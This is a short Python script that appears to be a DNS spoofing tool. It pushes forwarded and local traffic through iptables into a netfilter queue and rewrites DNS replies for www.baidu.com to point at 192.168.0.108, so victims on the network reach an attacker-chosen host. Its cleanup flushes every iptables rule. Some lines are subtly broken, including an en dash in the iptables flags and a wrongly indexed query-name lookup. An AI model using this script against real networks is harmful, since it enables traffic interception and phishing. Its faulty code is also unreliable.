#!/usr/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy


def init():
    subprocess.call("iptables -I FORWARD -j NFQUEUE –queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE –queue-num 0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE –queue-num 0", shell=True)


def process_packets(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            # print(scapy_packet.show())
            qname = scapy_packet[scapy.DNSQR.qname]  # byters - str
            # print(qname.decode("utf-8"))
            if "www.baidu.com" in qname.decode("utf-8"):
                print("[+] Target found!")
                ans = scapy.DNSRR(rrname=qname, rdata="192.168.0.108")
                scapy_packet[scapy.DNS].an = ans
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))
        packet.accept()
    except KeyboardInterrupt:
        clear()


def clear():
    subprocess.call("iptables --flush", shell=True)


init()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packets)
queue.run()
queue.unbind()
clear()